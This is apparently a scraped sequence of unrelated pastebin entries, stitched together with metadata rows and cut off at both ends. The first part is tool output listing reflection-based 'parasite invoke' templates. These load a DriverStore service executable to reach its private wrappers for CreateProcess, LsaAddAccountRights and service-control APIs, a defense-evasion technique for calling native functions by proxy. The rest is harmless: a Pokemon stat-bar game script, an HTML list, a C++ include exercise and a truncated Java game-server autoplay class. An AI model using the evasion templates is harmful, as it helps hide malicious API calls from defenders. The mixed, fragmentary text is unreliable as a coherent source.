        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------"
S5pDxxCu,Untitled,IncandescenceSy,C,Thursday 7th of March 2024 02:03:18 PM CDT,"task _GameInit()
{
	// Pokemon Stat Bar Creator
	// HSM = useHighStatMove is for handling extremely high stats
	// useStatChange = will show oldStat -> newStat
	// useBstChange = will show oldBst -> newBst
	
	//int[] stats = [100 + 100 + 100 + 55 + 87, 150 + 85 + 85 + 55 + 60, 90 + 100 + 80 + 55 + 95, 180 + 135 + 165 + 135 + 133, 160 + 115 + 100 + 135 + 91, 90 + 135 + 150 + 135 + 84];
	//int[] stats = [100 + 100 + 154 + 100 + 100, 135 + 165 + 140 + 135 + 180, 115 + 150 + 108 + 120 + 160, 85 + 85 + 50 + 60 + 150, 100 + 130 + 68 + 85 + 90, 135 + 50 + 50 + 50 + 90];
	int[] stats = [133, 35, 45, 80, 60, 107];
	string[] statTypes = [""HP"", ""Atk"", ""Def"", ""SpA"", ""SpD"", ""Spe"", ""BST""];
	
	bool useHighStatMode = false;
	bool useStatChange = true;
	bool useBstChange = false;
	
	int[] statChange = [75, 55, 70, 55, 95, 110];
	
	int iter = 0;
	for each(string i in ref statTypes)
	{
		CreateStatName(i, iter);
		iter++;
	}
	
	int bst = 0;
	int bstChange = 0;
	iter = 0;
	
	for each(int i in ref stats)
	{
		CreateStatBar(i, iter);
		
		string num = (i < 100) ? (""0"" ~ itoa(i)) : itoa(i);
		
		if(useStatChange)
		{
			int j = statChange[iter];
			string num2 = (j < 100) ? (""0"" ~ itoa(j)) : itoa(j);
			num = num2 ~ "" -> "" ~ num;
			
			bstChange += j;
		}
		
		int statNum = useHighStatMode ? 190 + (i / 2) : 190 + (i * 3);
		
		int statNumber = CreateTextObject
		(
			num, ""Lucida Console"", 10,
			statNum, 80 + (iter * 55),
			50, 500, ALIGNMENT_LEFT,
			BORDER_NONE, 0,
			COLOR_WHITE, COLOR_WHITE, COLOR_RED
		);
		
		iter++;
		
		bst += i;
	};
	
	string bstTextDisplay = useStatChange && useBstChange ? itoa(bstChange) ~ "" -> "" ~ itoa(bst) : itoa(bst);
	
	int bstText = CreateTextObject
	(
		bstTextDisplay, ""Lucida Console"", 10,
		180, 80 + 330,
		50, 500, ALIGNMENT_LEFT,
		BORDER_NONE, 0,
		COLOR_WHITE, COLOR_WHITE, COLOR_RED
	);
}

function<void> CreateStatName(string stat, int iter)
{
	int statName = CreateTextObject
	(
		stat, ""Lucida Console"", 10,
		80, 80 + (iter * 55),
		50, 500, ALIGNMENT_LEFT,
		BORDER_NONE, 0,
		COLOR_WHITE, COLOR_WHITE, COLOR_RED
	);
}
 
function<void> CreateStatBar(int num, int index)
{
	
	int bar = CreatePrimObject(10, PRIMITIVE_TRIANGLESTRIP, 4);
	
	int py = 103 + (index * 55);
	
	ObjPrim_SetVertexPosition(bar, 0, 180, py - 15, 0); // top left
	ObjPrim_SetVertexPosition(bar, 1, 180, py + 15, 0); // bottom left
	if(!useHighStatMode)
	{
		ObjPrim_SetVertexPosition(bar, 2, 180 + (num * 3), py - 15, 0); // top right
		ObjPrim_SetVertexPosition(bar, 3, 180 + (num * 3), py + 15, 0); // bottom right
	}else
	{
		ObjPrim_SetVertexPosition(bar, 2, 180 + (num / 2), py - 15, 0); // top right HSM
		ObjPrim_SetVertexPosition(bar, 3, 180 + (num / 2), py + 15, 0); // bottom right HSM
	}
	
	int hue = useHighStatMode ? num - 220 : max(0, num - 45);
	if(num >= 105) hue += 20;
	if(num >= 135) hue += 15;
	if(num >= 150) hue += 10;
	if(num >= 580) hue += 90; // HSM
	int s = 255;
	if(num >= 700) s = 0; // HSM
	hue = min(hue, 300); // HSM
	
	ObjPrim_SetVertexColorHSV(bar, 0, hue, s, 255);
	ObjPrim_SetVertexColorHSV(bar, 1, hue, s, 190);
	ObjPrim_SetVertexColorHSV(bar, 2, hue, s, 255);
	ObjPrim_SetVertexColorHSV(bar, 3, hue, s, 190);
}
"
dy1Nv7FX,Untitled,lemansky,HTML,Thursday 7th of March 2024 01:59:33 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>Document</title>
	<style>
		ul{
			box-sizing: border-box;
			width:30rem;
			list-style-type: none;
			display:flex;
			flex-wrap: wrap;
			justify-content: space-between;
		}
		li{
			height:3rem;
			width:3rem;
			margin:1rem;
			border-radius:100%;
			background-color: rgb(239 68 68);
			display:flex;
			align-items: center;
			justify-content: center;
			font-size:0px;
		}
	</style>
</head>
<body>
	<ul id=""list"">
		<li>d</li>
		<li>e</li>
		<li>b</li>
		<li>u</li>
		<li>g</li>
		<li>p</li>
		<li>a</li>
		<li>t</li>
		<li>c</li>
		<li>h</li>
	</ul>
	<script>
		
	</script>
</body>
</html>"
gw1rJJSY,СПРИНТ № 5 | Распределение кода по файлам | Урок 3: Директива #include 2/2,chevengur,C++,Thursday 7th of March 2024 01:48:17 PM CDT,"painter.h

#pragma once
#include ""wall.h""

class Painter {
public:
    void Paint(Wall& wall, Wall::Color color_) {
        wall.SetColor(color_);
    }
};

***************************************************************************************************************************************
wall.h

#pragma once

class Wall {
public:
    enum class Color { BLUE, GREEN, RED, WHITE, YELLOW };

    Wall(double width, double height)
        : width_(width)
        , height_(height)
        , color_(Color::WHITE) {
    }

    double GetHeight() const {
        return height_;
    }
    double GetWidth() const {
        return width_;
    }
    void SetColor(Color color) {
        color_ = color;
    }
    Color GetColor() const {
        return color_;
    }

private:
    double width_;
    double height_;
    Color color_;
};

***************************************************************************************************************************************
main.cpp

#include ""painter.h""

int main() {
    Painter bill;
    Wall wall(3.5, 2.45);

    bill.Paint(wall, Wall::Color::BLUE);
}


"
RYTahVXD,autoplay,BabaYAaga,Java,Thursday 7th of March 2024 01:46:25 PM CDT,"/*
 * This file is part of the L2J Mobius project.
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
package org.l2jmobius.gameserver.taskmanager;

import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

import org.l2jmobius.Config;
import org.l2jmobius.commons.threads.ThreadPool;
import org.l2jmobius.gameserver.ai.CtrlIntention;
import org.l2jmobius.gameserver.enums.Race;
import org.l2jmobius.gameserver.geoengine.GeoEngine;
import org.l2jmobius.gameserver.model.Location;
import org.l2jmobius.gameserver.model.Party;
import org.l2jmobius.gameserver.model.World;
import org.l2jmobius.gameserver.model.WorldObject;
import org.l2jmobius.gameserver.model.actor.Creature;
import org.l2jmobius.gameserver.model.actor.Player;
import org.l2jmobius.gameserver.model.actor.Summon;
import org.l2jmobius.gameserver.model.actor.instance.Monster;
import org.l2jmobius.gameserver.model.actor.instance.Pet;
import org.l2jmobius.gameserver.model.item.Weapon;
import org.l2jmobius.gameserver.model.item.instance.Item;
import org.l2jmobius.gameserver.model.skill.Skill;
import org.l2jmobius.gameserver.model.zone.ZoneId;
import org.l2jmobius.gameserver.network.serverpackets.autoplay.ExAutoPlayDoMacro;
import org.l2jmobius.gameserver.util.Util;

/**
 * @author Mobius
 */
public class AutoPlayTaskManager
{
	private static final Set<Set<Player>> POOLS = ConcurrentHashMap.newKeySet();
	private static final Map<Player, Integer> IDLE_COUNT = new ConcurrentHashMap<>();
	private static final int POOL_SIZE = 300;
	private static final int TASK_DELAY = 300;
	private static final Integer AUTO_ATTACK_ACTION = 2;
	private static final Integer PET_ATTACK_ACTION = 16;
	private static final Integer SUMMON_ATTACK_ACTION = 22;
	
	protected AutoPlayTaskManager()
	{
	}
	
	private class AutoPlay implements Runnable
	{
		private final Set<Player> _players;
		
		public AutoPlay(Set<Player> players)
		{
			_players = players;
		}
		
		@Override
		public void run()
		{
			if (_players.isEmpty())
			{
				return;
			}
			
			PLAY: for (Player player : _players)
			{
				if (!player.isOnline() || (player.isInOfflineMode() && !player.isOfflinePlay()) || !Config.ENABLE_AUTO_PLAY)
				{
					stopAutoPlay(player);
					continue PLAY;
				}
				
				if (player.isSitting() || player.isCastingNow() || (player.getQueuedSkill() != null))
				{
					continue PLAY;
				}
				
				// Next target mode.
				final int targetMode = player.getAutoPlaySettings().getNextTargetMode();
				
				// Skip thinking.
				final WorldObject target = player.getTarget();
				if ((target != null) && target.isCreature())
				{
					final Creature creature = (Creature) target;
					if (creature.isAlikeDead() || !isTargetModeValid(targetMode, player, creature))
					{
						// Logic for Spoil (254) skill.
						if (creature.isMonster() && creature.isDead() && player.getAutoUseSettings().getAutoSkills().contains(254))
						{
							final Skill sweeper = player.getKnownSkill(42);
							if (sweeper != null)
							{
								final Monster monster = ((Monster) target);
								if (monster.checkSpoilOwner(player, false))
								{
									// Move to target.
									if (player.calculateDistance2D(target) > 40)
									{
										if (!player.isMoving())
										{
											player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, target);
										}
										continue PLAY;
									}
									
									// Sweep target.
									player.doCast(sweeper);
									continue PLAY;
								}
							}
						}
						
						// Clear target.
						player.setTarget(null);
					}
					else if ((creature.getTarget() == player) || (creature.getTarget() == null))
					{
						// GeoEngine can see target check.
						if (!GeoEngine.getInstance().canSeeTarget(player, creature))
						{
							player.setTarget(null);
							continue PLAY;
						}
						
						// Pet Attack.
						final Pet pet = player.getPet();
